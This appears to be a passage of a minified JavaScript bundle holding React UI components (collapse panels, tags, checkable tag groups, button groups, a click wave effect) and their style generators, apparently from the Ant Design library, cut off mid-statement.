t.createElement(m.default,{visible:!0,motionAppear:!0,motionName:"wave-motion",motionDeadline:5e3,onAppearEnd:(e,t)=>{if(t.deadline||"opacity"===t.propertyName){let e=d.current?.parentElement;h(e).then(()=>{e?.remove()})}return!1}},({className:e},a)=>t.createElement("div",{ref:(0,n.composeRef)(d,a),className:(0,o.clsx)(r,e,{"wave-quick":O}),style:L}))};e.s(["default",0,e=>{let{children:s,disabled:m,component:h,colorSource:b}=e,{getPrefixCls:y}=(0,t.useContext)(a.ConfigContext),S=(0,t.useRef)(null),x=y("wave"),C=l(x),w=((e,r,n,o)=>{let{wave:i}=t.useContext(a.ConfigContext),[,s,l]=(0,d.default)(),m=(0,c.useEvent)(a=>{let c=e.current;if(i?.disabled||!c)return;let u=c.querySelector(`.${p}`)||c,{showEffect:d}=i||{};(d||((e,r)=>{var n;let o,{component:a}=r;if("Checkbox"===a&&!e.querySelector("input")?.checked)return;let i=document.createElement("div");i.style.position="absolute",i.style.left="0px",i.style.top="0px",e?.insertBefore(i,e?.firstChild),n=t.createElement(v,{...r,target:e}),(o=i[g]||(0,f.createRoot)(i)).render(n),i[g]=o}))(u,{className:r,token:s,component:n,event:a,hashId:l,colorSource:o})}),h=t.useRef(null);return t.useEffect(()=>()=>{u.default.cancel(h.current)},[]),e=>{u.default.cancel(h.current),h.current=(0,u.default)(()=>{m(e)})}})(S,(0,o.clsx)(x,C),h,b);if(t.default.useEffect(()=>{let e=S.current;if(!e||e.nodeType!==window.Node.ELEMENT_NODE||m)return;let t=t=>{!(0,r.default)(t.target)||!e.getAttribute||e.getAttribute("disabled")||e.disabled||e.className.includes("disabled")&&!e.className.includes("disabled:")||"true"===e.getAttribute("aria-disabled")||e.className.includes("-leave")||w(t)};return e.addEventListener("click",t,!0),()=>{e.removeEventListener("click",t,!0)}},[m]),!t.default.isValidElement(s))return s??null;let k=(0,n.supportRef)(s)?(0,n.composeRef)((0,n.getNodeRef)(s),S):S;return(0,i.cloneElement)(s,{ref:k})}],21872)},2599,47580,88122,e=>{"use strict";var t=e.i(62464);e.s(["ColorBlock",()=>t.default],2599),e.i(47167);var r=e.i(71645),n=e.i(86612),o=e.i(31067),a=e.i(7670);e.i(63335);var i=e.i(30294),s=e.i(80251),l=e.i(24308),c=e.i(67007),u=e.i(28473),d=e.i(30731);let p=r.default.forwardRef((e,t)=>{let{prefixCls:n,forceRender:o,className:i,style:s,children:l,isActive:c,role:u,classNames:d,styles:p}=e,[m,f]=r.default.useState(c||o);return(r.default.useEffect(()=>{(o||c)&&f(!0)},[o,c]),m)?r.default.createElement("div",{ref:t,className:(0,a.clsx)(`${n}-panel`,{[`${n}-panel-active`]:c,[`${n}-panel-inactive`]:!c},i),style:s,role:u},r.default.createElement("div",{className:(0,a.clsx)(`${n}-body`,d?.body),style:p?.body},l)):null}),m=r.default.forwardRef((e,t)=>{let{showArrow:n=!0,headerClass:i,isActive:s,onItemClick:l,forceRender:c,className:m,classNames:f={},styles:g={},prefixCls:h,collapsible:b,accordion:y,panelKey:v,extra:S,header:x,expandIcon:C,openMotion:w,destroyOnHidden:k,children:$,...E}=e,P="disabled"===b,T={onClick:()=>{l?.(v)},onKeyDown:e=>{("Enter"===e.key||e.keyCode===d.default.ENTER||e.which===d.default.ENTER)&&l?.(v)},role:y?"tab":"button","aria-expanded":s,"aria-disabled":P,tabIndex:P?-1:0},I="function"==typeof C?C(e):r.default.createElement("i",{className:"arrow"}),M=I&&r.default.createElement("div",(0,o.default)({className:(0,a.clsx)(`${h}-expand-icon`,f?.icon),style:g?.icon},["header","icon"].includes(b)?T:{}),I),R=(0,a.clsx)(`${h}-item`,{[`${h}-item-active`]:s,[`${h}-item-disabled`]:P},m),A={className:(0,a.clsx)(i,`${h}-header`,{[`${h}-collapsible-${b}`]:!!b},f?.header),style:g?.header,...["header","icon"].includes(b)?{}:T};return r.default.createElement("div",(0,o.default)({},E,{ref:t,className:R}),r.default.createElement("div",A,n&&M,r.default.createElement("span",(0,o.default)({className:(0,a.clsx)(`${h}-title`,f?.title),style:g?.title},"header"===b?T:{}),x),null!=S&&"boolean"!=typeof S&&r.default.createElement("div",{className:`${h}-extra`},S)),r.default.createElement(u.default,(0,o.default)({visible:s,leavedClassName:`${h}-panel-hidden`},w,{forceRender:c,removeOnLeave:k}),({className:e,style:t},n)=>r.default.createElement(p,{ref:n,prefixCls:h,className:e,classNames:f,style:t,styles:g,isActive:s,forceRender:c,role:y?"tabpanel":void 0},$)))});function f(e,t,r){if(!e||!t)return e||t;let n=Array.from(new Set([...Object.keys(e),...Object.keys(t)])),o={};return n.forEach(n=>{o[n]=r(e[n],t[n])}),o}var g=e.i(50824);function h(e){let t=e;if(!Array.isArray(t)){let e=typeof t;t="number"===e||"string"===e?[t]:[]}return t.map(e=>String(e))}let b=Object.assign(r.default.forwardRef((e,t)=>{var n;let{prefixCls:u="rc-collapse",destroyOnHidden:d=!1,style:p,accordion:b,className:y,children:v,collapsible:S,openMotion:x,expandIcon:C,activeKey:w,defaultActiveKey:k,onChange:$,items:E,classNames:P,styles:T}=e,I=(0,a.clsx)(u,y),[M,R]=(0,i.useControlledState)(k,w),A=h(M),D=(0,s.useEvent)(e=>{let t=h(e);R(t),$?.(t)});(0,l.default)(!v,"[rc-collapse] `children` will be removed in next major version. Please use `items` instead.");let L=(n={prefixCls:u,accordion:b,openMotion:x,expandIcon:C,collapsible:S,destroyOnHidden:d,onItemClick:e=>{b?D(A[0]===e?[]:[e]):D(A.includes(e)?A.filter(t=>t!==e):[...A,e])},activeKey:A,classNames:P,styles:T},Array.isArray(E)?((e,t)=>{let{prefixCls:n,accordion:i,collapsible:s,destroyOnHidden:l,onItemClick:c,activeKey:u,openMotion:d,expandIcon:p,classNames:g,styles:h}=t;return e.map((e,t)=>{let{children:b,label:y,key:v,collapsible:S,onItemClick:x,destroyOnHidden:C,classNames:w,styles:k,...$}=e,E=String(v??t),P=S??s,T=!1;return T=i?u[0]===E:u.indexOf(E)>-1,r.default.createElement(m,(0,o.default)({},$,{classNames:f(g,w,(e,t)=>(0,a.default)(e,t)),styles:f(h,k,(e,t)=>({...e,...t})),prefixCls:n,key:E,panelKey:E,isActive:T,accordion:i,openMotion:d,expandIcon:p,header:y,collapsible:P,onItemClick:e=>{"disabled"!==P&&(c(e),x?.(e))},destroyOnHidden:C??l}),b)})})(E,n):(0,c.default)(v).map((e,t)=>((e,t,n)=>{if(!e)return null;let{prefixCls:o,accordion:a,collapsible:i,destroyOnHidden:s,onItemClick:l,activeKey:c,openMotion:u,expandIcon:d,classNames:p,styles:m}=n,f=e.key||String(t),{header:g,headerClass:h,destroyOnHidden:b,collapsible:y,onItemClick:v}=e.props,S=!1;S=a?c[0]===f:c.indexOf(f)>-1;let x=y??i,C={key:f,panelKey:f,header:g,headerClass:h,classNames:p,styles:m,isActive:S,prefixCls:o,destroyOnHidden:b??s,openMotion:u,accordion:a,children:e.props.children,onItemClick:e=>{"disabled"!==x&&(l(e),v?.(e))},expandIcon:d,collapsible:x};return"string"==typeof e.type?e:(Object.keys(C).forEach(e=>{void 0===C[e]&&delete C[e]}),r.default.cloneElement(e,C))})(e,t,n)));return r.default.createElement("div",(0,o.default)({ref:t,className:I,style:p,role:b?"tablist":void 0},(0,g.default)(e,{aria:!0,data:!0})),L)}),{Panel:m}),{Panel:y}=b;var v=e.i(51095),S=e.i(43081),x=e.i(11517),C=e.i(13541),w=e.i(63731),k=e.i(42064),$=e.i(17455);let E=r.forwardRef((e,t)=>{let{getPrefixCls:n}=r.useContext(k.ConfigContext),{prefixCls:o,className:i,showArrow:s=!0}=e,l=n("collapse",o),c=(0,a.clsx)({[`${l}-no-arrow`]:!s},i);return r.createElement(b.Panel,{ref:t,...e,prefixCls:l,className:c})});e.i(96059);var P=e.i(15654),T=e.i(83293);let I=e=>{let{componentCls:t,antCls:r,motionDurationMid:n,motionEaseInOut:o}=e;return{[t]:{[`${r}-motion-collapse-legacy`]:{overflow:"hidden","&-active":{transition:`${["height","opacity"].map(e=>`${e} ${n} ${o}`).join(", ")} !important`}},[`${r}-motion-collapse`]:{overflow:"hidden",transition:`${["height","opacity"].map(e=>`${e} ${n} ${o}`).join(", ")} !important`}}}};e.s(["genCollapseMotion",0,I],47580);var M=e.i(46422),R=e.i(38378);let A=(0,M.genStyleHooks)("Collapse",e=>{let t=(0,R.mergeToken)(e,{collapseHeaderPaddingSM:`${(0,P.unit)(e.paddingXS)} ${(0,P.unit)(e.paddingSM)}`,collapseHeaderPaddingLG:`${(0,P.unit)(e.padding)} ${(0,P.unit)(e.paddingLG)}`,collapsePanelBorderRadius:e.borderRadiusLG});return[(e=>{let{componentCls:t,contentBg:r,padding:n,headerBg:o,headerPadding:a,collapseHeaderPaddingSM:i,collapseHeaderPaddingLG:s,collapsePanelBorderRadius:l,lineWidth:c,lineType:u,colorBorder:d,colorText:p,colorTextHeading:m,colorTextDisabled:f,fontSizeLG:g,lineHeight:h,lineHeightLG:b,marginSM:y,paddingSM:v,paddingLG:S,paddingXS:x,motionDurationSlow:C,fontSizeIcon:w,contentPadding:k,fontHeight:$,fontHeightLG:E}=e,I=`${(0,P.unit)(c)} ${u} ${d}`;return{[t]:{...(0,T.resetComponent)(e),backgroundColor:o,border:I,borderRadius:l,"&-rtl":{direction:"rtl"},[`& > ${t}-item`]:{borderBottom:I,"&:first-child":{[`
            &,
            & > ${t}-header`]:{borderRadius:`${(0,P.unit)(l)} ${(0,P.unit)(l)} 0 0`}},"&:last-child":{[`
            &,
            & > ${t}-header`]:{borderRadius:`0 0 ${(0,P.unit)(l)} ${(0,P.unit)(l)}`}},[`> ${t}-header`]:{position:"relative",display:"flex",flexWrap:"nowrap",alignItems:"flex-start",padding:a,color:m,lineHeight:h,cursor:"pointer",transition:`all ${C}, visibility 0s`,...(0,T.genFocusStyle)(e),[`> ${t}-title`]:{flex:"auto"},[`${t}-expand-icon`]:{height:$,display:"flex",alignItems:"center",marginInlineEnd:y},[`${t}-arrow`]:{...(0,T.resetIcon)(),fontSize:w,transition:`transform ${C}`,svg:{transition:`transform ${C}`}},[`${t}-title`]:{marginInlineEnd:"auto"}},[`${t}-collapsible-header`]:{cursor:"default",[`${t}-title`]:{flex:"none",cursor:"pointer"},[`${t}-expand-icon`]:{cursor:"pointer"}},[`${t}-collapsible-icon`]:{cursor:"unset",[`${t}-expand-icon`]:{cursor:"pointer"}}},[`${t}-panel`]:{color:p,backgroundColor:r,borderTop:I,[`& > ${t}-body`]:{padding:k},"&-hidden":{display:"none"}},"&-small":{[`> ${t}-item`]:{[`> ${t}-header`]:{padding:i,paddingInlineStart:x,[`> ${t}-expand-icon`]:{marginInlineStart:e.calc(v).sub(x).equal()}},[`> ${t}-panel > ${t}-body`]:{padding:v}}},"&-large":{[`> ${t}-item`]:{fontSize:g,lineHeight:b,[`> ${t}-header`]:{padding:s,paddingInlineStart:n,[`> ${t}-expand-icon`]:{height:E,marginInlineStart:e.calc(S).sub(n).equal()}},[`> ${t}-panel > ${t}-body`]:{padding:S}}},[`${t}-item:last-child`]:{borderBottom:0,[`> ${t}-panel`]:{borderRadius:`0 0 ${(0,P.unit)(l)} ${(0,P.unit)(l)}`}},[`& ${t}-item-disabled > ${t}-header`]:{[`
          &,
          & > .arrow
        `]:{color:f,cursor:"not-allowed"}},[`&${t}-icon-placement-end`]:{[`& > ${t}-item`]:{[`> ${t}-header`]:{[`${t}-expand-icon`]:{order:1,marginInlineEnd:0,marginInlineStart:y}}}}}}})(t),(e=>{let{componentCls:t,headerBg:r,borderlessContentPadding:n,borderlessContentBg:o,colorBorder:a}=e;return{[`${t}-borderless`]:{backgroundColor:r,border:0,[`> ${t}-item`]:{borderBottom:`1px solid ${a}`},[`
        > ${t}-item:last-child,
        > ${t}-item:last-child ${t}-header
      `]:{borderRadius:0},[`> ${t}-item:last-child`]:{borderBottom:0},[`> ${t}-item > ${t}-panel`]:{backgroundColor:o,borderTop:0},[`> ${t}-item > ${t}-panel > ${t}-body`]:{padding:n}}}})(t),(e=>{let{componentCls:t,paddingSM:r}=e;return{[`${t}-ghost`]:{backgroundColor:"transparent",border:0,[`> ${t}-item`]:{borderBottom:0,[`> ${t}-panel`]:{backgroundColor:"transparent",border:0,[`> ${t}-body`]:{paddingBlock:r}}}}}})(t),(e=>{let{componentCls:t}=e,r=`> ${t}-item > ${t}-header ${t}-arrow`;return{[`${t}-rtl`]:{[r]:{transform:"rotate(180deg)"}}}})(t),I(t)]},e=>({headerPadding:`${e.paddingSM}px ${e.padding}px`,headerBg:e.colorFillAlter,contentPadding:`${e.padding}px 16px`,contentBg:e.colorBgContainer,borderlessContentPadding:`${e.paddingXXS}px 16px ${e.padding}px`,borderlessContentBg:"transparent"})),D=Object.assign(r.forwardRef((e,t)=>{let{getPrefixCls:o,direction:i,expandIcon:s,className:l,style:c,classNames:u,styles:d}=(0,k.useComponentConfig)("collapse"),{prefixCls:p,className:m,rootClassName:f,style:g,bordered:h=!0,ghost:y,size:E,expandIconPlacement:P,expandIconPosition:T,children:I,destroyInactivePanel:M,destroyOnHidden:R,expandIcon:D,classNames:L,styles:_}=e,O=(0,$.default)(e=>E??e??"middle"),N=o("collapse",p),F=o(),[j,H]=A(N),B=P??T??"start",z={...e,size:O,bordered:h,expandIconPlacement:B},[V,W]=(0,x.useMergeSemantic)([u,L],[d,_],{props:z}),U=D??s,q=r.useCallback((e={})=>{let t="function"==typeof U?U(e):r.createElement(n.default,{rotate:e.isActive?"rtl"===i?-90:90:void 0,"aria-label":e.isActive?"expanded":"collapsed"});return(0,w.cloneElement)(t,e=>({className:(0,a.clsx)(e.className,`${N}-arrow`)}))},[U,N,i]),G=(0,a.clsx)(`${N}-icon-placement-${B}`,{[`${N}-borderless`]:!h,[`${N}-rtl`]:"rtl"===i,[`${N}-ghost`]:!!y,[`${N}-large`]:"large"===O,[`${N}-small`]:"small"===O},l,m,f,j,H,V.root),J=r.useMemo(()=>({...(0,C.default)(F),motionAppear:!1,leavedClassName:`${N}-panel-hidden`}),[F,N]),X=r.useMemo(()=>I?(0,S.toArray)(I).map(e=>e):null,[I]);return r.createElement(b,{ref:t,openMotion:J,...(0,v.omit)(e,["rootClassName"]),expandIcon:q,prefixCls:N,className:G,style:{...W.root,...c,...g},classNames:V,styles:W,destroyOnHidden:R??M},X)}),{Panel:E});e.s(["default",0,D],88122)},991,e=>{"use strict";e.i(71645),e.i(9808),e.i(2599);var t=e.i(14690);e.i(7670),e.i(88122),e.i(8850),e.i(4458),e.i(56449),e.s(["isBright",0,(e,r)=>{let{r:n,g:o,b:a,a:i}=e.toRgb(),s=new t.Color(e.toRgbString()).onBackground(r).toHsv();return i<=.5?s.v>.5:.299*n+.587*o+.114*a>192}])},49181,20244,83773,e=>{"use strict";var t=e.i(71645),r=e.i(7670),n=e.i(42064),o=e.i(37328);e.i(96059);var a=e.i(15654);e.i(62370);var i=e.i(35551),s=e.i(71070),l=e.i(991),c=e.i(83293),u=e.i(46422),d=e.i(38378);let p=e=>{let{lineWidth:t,fontSizeIcon:r,calc:n}=e,o=e.fontSizeSM;return(0,d.mergeToken)(e,{tagFontSize:o,tagLineHeight:(0,a.unit)(n(e.lineHeightSM).mul(o).equal()),tagIconSize:n(r).sub(n(t).mul(2)).equal(),tagPaddingHorizontal:8,tagBorderlessBg:e.defaultBg})},m=e=>{let t=(0,l.isBright)(new s.AggregationColor(e.colorBgSolid),"#fff")?"#000":"#fff";return{defaultBg:new i.FastColor(e.colorFillTertiary).onBackground(e.colorBgContainer).toHexString(),defaultColor:e.colorText,solidTextColor:t}},f=(0,u.genStyleHooks)("Tag",e=>(e=>{let{paddingXXS:t,lineWidth:r,tagPaddingHorizontal:n,componentCls:o,calc:i}=e,s=i(n).sub(r).equal(),l=i(t).sub(r).equal();return{[o]:{...(0,c.resetComponent)(e),display:"inline-block",height:"auto",paddingInline:s,fontSize:e.tagFontSize,lineHeight:e.tagLineHeight,whiteSpace:"nowrap",backgroundColor:e.defaultBg,border:`${(0,a.unit)(e.lineWidth)} ${e.lineType} ${e.colorBorder}`,borderRadius:e.borderRadiusSM,opacity:1,transition:`all ${e.motionDurationMid}`,textAlign:"start",position:"relative",[`&${o}-rtl`]:{direction:"rtl"},"&, a, a:hover":{color:e.defaultColor},[`${o}-close-icon`]:{marginInlineStart:l,fontSize:e.tagIconSize,color:e.colorIcon,cursor:"pointer",transition:`all ${e.motionDurationMid}`,"&:hover":{color:e.colorTextHeading}},"&-checkable":{backgroundColor:"transparent",borderColor:"transparent",cursor:"pointer",[`&:not(${o}-checkable-checked):hover`]:{color:e.colorPrimary,backgroundColor:e.colorFillSecondary},"&:active, &-checked":{color:e.colorTextLightSolid},"&-checked":{backgroundColor:e.colorPrimary,"&:hover":{backgroundColor:e.colorPrimaryHover}},"&:active":{backgroundColor:e.colorPrimaryActive},"&-disabled":{cursor:"not-allowed",[`&:not(${o}-checkable-checked)`]:{color:e.colorTextDisabled,"&:hover":{backgroundColor:"transparent"}},[`&${o}-checkable-checked`]:{color:e.colorTextDisabled,backgroundColor:e.colorBgContainerDisabled},"&:hover, &:active":{backgroundColor:e.colorBgContainerDisabled,color:e.colorTextDisabled},[`&:not(${o}-checkable-checked):hover`]:{color:e.colorTextDisabled}},"&-group":{display:"flex",flexWrap:"wrap",gap:e.paddingXS}},"&-hidden":{display:"none"},[`> ${e.iconCls} + span, > span + ${e.iconCls}`]:{marginInlineStart:s}},[`&${e.componentCls}-solid`]:{borderColor:"transparent",color:e.colorTextLightSolid,backgroundColor:e.colorBgSolid,[`&${o}-default`]:{color:e.solidTextColor}},[`${o}-filled`]:{borderColor:"transparent",backgroundColor:e.tagBorderlessBg},[`&${o}-disabled`]:{color:e.colorTextDisabled,cursor:"not-allowed",backgroundColor:e.colorBgContainerDisabled,a:{cursor:"not-allowed",pointerEvents:"none",color:e.colorTextDisabled,"&:hover":{color:e.colorTextDisabled}},"a&":{"&:hover, &:active":{color:e.colorTextDisabled}},[`&${o}-outlined`]:{borderColor:e.colorBorderDisabled},[`&${o}-solid, &${o}-filled`]:{color:e.colorTextDisabled,[`${o}-close-icon`]:{color:e.colorTextDisabled}},[`${o}-close-icon`]:{cursor:"not-allowed",color:e.colorTextDisabled,"&:hover":{color:e.colorTextDisabled}}}}})(p(e)),m);e.s(["default",0,f,"prepareComponentToken",0,m,"prepareToken",0,p],20244);let g=t.forwardRef((e,a)=>{let{prefixCls:i,style:s,className:l,checked:c,children:u,icon:d,onChange:p,onClick:m,disabled:g,...h}=e,{getPrefixCls:b,tag:y}=t.useContext(n.ConfigContext),v=t.useContext(o.default),S=g??v,x=b("tag",i),[C,w]=f(x),k=(0,r.clsx)(x,`${x}-checkable`,{[`${x}-checkable-checked`]:c,[`${x}-checkable-disabled`]:S},y?.className,l,C,w);return t.createElement("span",{...h,ref:a,style:{...s,...y?.style},className:k,onClick:e=>{S||(p?.(!c),m?.(e))}},d,t.createElement("span",null,u))});e.s(["default",0,g],49181),e.i(47167);var h=e.i(8211);e.i(63335);var b=e.i(30294),y=e.i(50824),v=e.i(11517),S=e.i(21883);let x=t.default.forwardRef((e,o)=>{let{id:a,prefixCls:i,rootClassName:s,className:l,style:c,classNames:u,styles:d,disabled:p,options:m,value:x,defaultValue:C,onChange:w,multiple:k,...$}=e,{getPrefixCls:E,direction:P,className:T,style:I,classNames:M,styles:R}=(0,n.useComponentConfig)("tag"),A=E("tag",i),D=`${A}-checkable-group`,L=(0,S.default)(A),[_,O]=f(A,L),[N,F]=(0,v.useMergeSemantic)([M,u],[R,d],{props:e}),j=(0,t.useMemo)(()=>Array.isArray(m)?m.map(e=>e&&"object"==typeof e?e:{value:e,label:e}):[],[m]),[H,B]=(0,b.useControlledState)(C,x),z=t.default.useRef(null);(0,t.useImperativeHandle)(o,()=>({nativeElement:z.current}));let V=(0,y.default)($,{aria:!0,data:!0});return t.default.createElement("div",{...V,className:(0,r.clsx)(D,T,s,{[`${D}-disabled`]:p,[`${D}-rtl`]:"rtl"===P},_,O,l,N.root),style:{...I,...F.root,...c},id:a,ref:z},j.map(e=>t.default.createElement(g,{key:e.value,className:(0,r.clsx)(`${D}-item`,N.item),style:F.item,checked:k?(H||[]).includes(e.value):H===e.value,onChange:t=>((e,t)=>{let r=null;if(k){let n=H||[];r=e?[].concat((0,h.default)(n),[t.value]):n.filter(e=>e!==t.value)}else r=e?t.value:null;B(r),w?.(r)})(t,e),disabled:p},e.label)))});e.s(["default",0,x],83773)},50664,e=>{"use strict";var t=e.i(71645);e.i(62370);var r=e.i(35551),n=e.i(2779);function o(e,o){let{color:a,variant:i,bordered:s}=e;return t.useMemo(()=>{let e,t=a?.endsWith("-inverse");e=i||(t?"solid":!1===s?"filled":o||"filled");let l=t?a?.replace("-inverse",""):a,c=(0,n.isPresetColor)(a),u=(0,n.isPresetStatusColor)(a),d={};if(!c&&!u&&l)if("solid"===e)d.backgroundColor=a;else{let t=new r.FastColor(l).toHsl();t.l=.95,d.backgroundColor=new r.FastColor(t).toHexString(),d.color=a,"outlined"===e&&(d.borderColor=a)}return[e,l,c,u,d]},[a,i,s,o])}e.s(["default",()=>o])},62218,e=>{"use strict";e.i(47167);var t=e.i(71645);e.i(63335);var r=e.i(51095),n=e.i(7670),o=e.i(63113),a=e.i(11517),i=e.i(63731),s=e.i(21872),l=e.i(42064),c=e.i(37328),u=e.i(49181),d=e.i(83773),p=e.i(50664),m=e.i(20244),f=e.i(3541),g=e.i(46422);let h=(0,g.genSubStyleComponent)(["Tag","preset"],e=>{let t;return t=(0,m.prepareToken)(e),(0,f.genPresetColor)(t,(e,{textColor:r,lightBorderColor:n,lightColor:o,darkColor:a})=>({[`${t.componentCls}${t.componentCls}-${e}:not(${t.componentCls}-disabled)`]:{[`&${t.componentCls}-outlined`]:{backgroundColor:o,borderColor:n,color:r},[`&${t.componentCls}-solid`]:{backgroundColor:a,borderColor:a,color:t.colorTextLightSolid},[`&${t.componentCls}-filled`]:{backgroundColor:o,color:r}}}))},m.prepareComponentToken),b=(e,t,r)=>{let n="string"!=typeof r?r:r.charAt(0).toUpperCase()+r.slice(1);return{[`${e.componentCls}${e.componentCls}-${t}:not(${e.componentCls}-disabled)`]:{[`&${e.componentCls}-outlined`]:{backgroundColor:e[`color${n}Bg`],borderColor:e[`color${n}Border`],color:e[`color${r}`]},[`&${e.componentCls}-solid`]:{backgroundColor:e[`color${r}`],borderColor:e[`color${r}`]},[`&${e.componentCls}-filled`]:{backgroundColor:e[`color${n}Bg`],color:e[`color${r}`]}}}},y=(0,g.genSubStyleComponent)(["Tag","status"],e=>{let t=(0,m.prepareToken)(e);return[b(t,"success","Success"),b(t,"processing","Info"),b(t,"error","Error"),b(t,"warning","Warning")]},m.prepareComponentToken),v=t.forwardRef((e,u)=>{let{prefixCls:d,className:f,rootClassName:g,style:b,children:v,icon:S,color:x,variant:C,onClose:w,bordered:k,disabled:$,href:E,target:P,styles:T,classNames:I,...M}=e,{getPrefixCls:R,direction:A,className:D,variant:L,style:_,classNames:O,styles:N}=(0,l.useComponentConfig)("tag"),[F,j,H,B,z]=(0,p.default)(e,L),V=H||B,W=t.useContext(c.default),U=$??W,{tag:q}=t.useContext(l.ConfigContext),[G,J]=t.useState(!0),X=(0,r.omit)(M,["closeIcon","closable"]),K={...e,color:j,variant:F,disabled:U,href:E,target:P,icon:S},[Q,Y]=(0,a.useMergeSemantic)([O,I],[N,T],{props:K}),Z=t.useMemo(()=>{let e={...Y.root,..._,...b};return U||(e={...z,...e}),e},[Y.root,_,b,z,U]),ee=R("tag",d),[et,er]=(0,m.default)(ee),en=(0,n.clsx)(ee,D,Q.root,`${ee}-${F}`,{[`${ee}-${j}`]:V,[`${ee}-hidden`]:!G,[`${ee}-rtl`]:"rtl"===A,[`${ee}-disabled`]:U},f,g,et,er),eo=e=>{U||(e.stopPropagation(),w?.(e),e.defaultPrevented||J(!1))},[,ea]=(0,o.useClosable)((0,o.pickClosable)(e),(0,o.pickClosable)(q),{closable:!1,closeIconRender:e=>{let r=t.createElement("span",{className:`${ee}-close-icon`,onClick:eo},e);return(0,i.replaceElement)(e,r,e=>({onClick:t=>{e?.onClick?.(t),eo(t)},className:(0,n.clsx)(e?.className,`${ee}-close-icon`)}))}}),ei="function"==typeof M.onClick||v&&"a"===v.type,es=(0,i.cloneElement)(S,{className:(0,n.clsx)(t.isValidElement(S)?S.props?.className:void 0,Q.icon),style:Y.icon}),el=es?t.createElement(t.Fragment,null,es,v&&t.createElement("span",{className:Q.content,style:Y.content},v)):v,ec=t.createElement(E?"a":"span",{...X,ref:u,className:en,style:Z,href:U?void 0:E,target:P,onClick:U?void 0:X.onClick,...E&&U?{"aria-disabled":!0}:{}},el,ea,H&&t.createElement(h,{key:"preset",prefixCls:ee}),B&&t.createElement(y,{key:"status",prefixCls:ee}));return ei?t.createElement(s.default,{component:"Tag"},ec):ec});v.CheckableTag=u.default,v.CheckableTagGroup=d.default,e.s(["Tag",0,v],62218)},52806,62405,e=>{"use strict";e.i(47167);var t=e.i(71645),r=e.i(7670),n=e.i(42064),o=e.i(4458);let a=t.createContext(void 0);e.s(["GroupSizeContext",0,a,"default",0,e=>{let{getPrefixCls:i,direction:s}=t.useContext(n.ConfigContext),{prefixCls:l,size:c,className:u,...d}=e,p=i("btn-group",l),[,,m]=(0,o.useToken)(),f=t.useMemo(()=>{switch(c){case"large":return"lg";case"small":return"sm";default:return""}},[c]),g=(0,r.clsx)(p,{[`${p}-${f}`]:f,[`${p}-rtl`]:"rtl"===s},u,m);return t.createElement(a.Provider,{value:c},t.createElement("div",{...d,className:g}))}],52806);var i=e.i(8211),s=e.i(76398),l=e.i(63731),c=e.i(17933);let u=/^[\u4E00-\u9FA5]{2}$/,d=u.test.bind(u);function p(e){return"string"==typeof e}function m(e){return"text"===e||"link"===e}function f(e,n,o,a){let i=!1,c=[];return t.default.Children.forEach(e,e=>{let t=typeof e,r="string"===t||"number"===t;if(i&&r){let t=c.length-1,r=c[t];c[t]=`${r}${e}`}else c.push(e);i=r}),t.default.Children.map(c,e=>(function(e,n,o,a){if(!(0,s.default)(e)||""===e)return;let i=n?" ":"";return"string"!=typeof e&&"number"!=typeof e&&p(e.type)&&d(e.props.children)?(0,l.cloneElement)(e,e=>{let t=(0,r.clsx)(e.className,a)||void 0,n={...o,...e.style};return{...e,children:e.children.split("").join(i),className:t,style:n}}):p(e)?t.default.createElement("span",{className:a,style:o},d(e)?e.split("").join(i):e):(0,l.isFragment)(e)?t.default.createElement("span",{className:a,style:o},e):(0,l.cloneElement)(e,e=>({...e,className:(0,r.clsx)(e.className,a)||void 0,style:{...e.style,...o}}))})(e,n,o,a))}["default","primary","danger"].concat((0,i.default)(c.PresetColors)),e.s(["isTwoCNChar",0,d,"isUnBorderedButtonVariant",()=>m,"spaceChildren",()=>f],62405)},68004,69693,28040,70977,e=>{"use strict";var t=e.i(71645),r=e.i(39295),n=e.i(28473),o=e.i(7670);let a=(0,t.forwardRef)((e,r)=>{let{className:n,style:a,children:i,prefixCls:s}=e,l=(0,o.clsx)(`${s}-icon`,n);return t.default.createElement("span",{ref:r,className:l,style:a},i)});e.s(["default",0,a],69693);let i=(0,t.forwardRef)((e,n)=>{let{prefixCls:i,className:s,style:l,iconClassName:c}=e,u=(0,o.clsx)(`${i}-loading-icon`,s);return t.default.createElement(a,{prefixCls:i,className:u,style:l,ref:n},t.default.createElement(r.default,{className:c}))}),s=()=>({width:0,opacity:0,transform:"scale(0)"}),l=e=>({width:e.scrollWidth,opacity:1,transform:"scale(1)"});e.s(["default",0,e=>{let{prefixCls:r,loading:a,existIcon:c,className:u,style:d,mount:p}=e;return c?t.default.createElement(i,{prefixCls:r,className:u,style:d}):t.default.createElement(n.default,{visible:!!a,motionName:`${r}-loading-icon-motion`,motionAppear:!p,motionEnter:!p,motionLeave:!p,removeOnLeave:!0,onAppearStart:s,onAppearActive:l,onEnterStart:s,onEnterActive:l,onLeaveStart:l,onLeaveActive:s},({className:e,style:n},a)=>{let s={...d,...n};return t.default.createElement(i,{prefixCls:r,className:(0,o.clsx)(u,e),style:s,ref:a})})}],68004),e.s(["genNoMotionStyle",0,()=>({"@media (prefers-reduced-motion: reduce)":{transition:"none",animation:"none"}})],28040);let c=(e,t)=>({[`> span, > ${e}`]:{"&:not(:last-child)":{[`&, & > ${e}`]:{"&:not(:disabled)":{borderInlineEndColor:t}}},"&:not(:first-child)":{[`&, & > ${e}`]:{"&:not(:disabled)":{borderInlineStartColor:t}}}}});e.s(["default",0,e=>{let{componentCls:t,fontSize:r,lineWidth:n,groupBorderColor:o,colorErrorHover:a}=e;return{[`${t}-group`]:[{position:"relative",display:"inline-flex",[`> span, > ${t}`]:{"&:not(:last-child)":{[`&, & > ${t}`]:{borderStartEndRadius:0,borderEndEndRadius:0}},"&:not(:first-child)":{marginInlineStart:e.calc(n).mul(-1).equal(),[`&, & > ${t}`]:{borderStartStartRadius:0,borderEndStartRadius:0}}},[t]:{position:"relative",zIndex:1,"&:hover, &:focus, &:active":{zIndex:2},"&[disabled]":{zIndex:0}},[`${t}-icon-only`]:{fontSize:r}},c(`${t}-primary`,o),c(`${t}-danger`,a)]}}],70977)},34596,e=>{"use strict";e.i(47167);var t=e.i(71645);e.i(63335);var r=e.i(51095),n=e.i(43081),o=e.i(32839),a=e.i(1676),i=e.i(7670),s=e.i(11517),l=e.i(76398),c=e.i(21872),u=e.i(42064),d=e.i(37328),p=e.i(17455),m=e.i(87166),f=e.i(52806),g=e.i(62405),h=e.i(68004),b=e.i(69693);e.i(96059);var 